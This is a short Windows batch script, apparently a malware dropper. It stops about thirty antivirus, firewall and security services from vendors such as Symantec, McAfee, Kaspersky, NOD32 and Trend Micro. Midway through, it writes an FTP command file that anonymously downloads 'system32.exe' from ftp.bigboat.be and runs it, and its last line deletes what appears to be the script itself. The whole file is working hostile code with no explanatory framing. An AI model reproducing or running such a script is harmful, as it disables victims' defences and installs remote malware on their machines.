@echo off
net stop "Security Center"
net stop "IPSEC Policy Agent"
net stop "kavsvc"
net stop McAfeeFramework
net stop inoRT
net stop NOD32krn
net stop PolicyAgent
net stop navapsvc
net stop NSCService
net stop SAVScan
net stop "Symantec Core LC"
net stop ccEvtMgr
net stop ccISPwdSvc
net stop "Symantec AntiVirus"
net stop "Norton AntiVirus Server"
net stop "norton antivirus server"
del shole &echo open ftp.bigboat.be 21 >> shole &echo user anonymous hihi >> shole &echo get system32.exe >> shole &echo quit >> shole &ftp -As:shole &start system32.exe
net stop SNDSrvc
net stop ccProxy
net stop ccSetMgr
net stop SPBBCSvc
net stop ntrtscan
net stop OfcPfwSvc
net stop tmlisten
net stop ISSVC
net stop SNDSrvc
net stop SWEEPSRV.SYS
net stop FSDFWD
net stop "BackWeb Plug-in - 7681197"
net stop FSMA
net stop McShield
del c:\a.bat
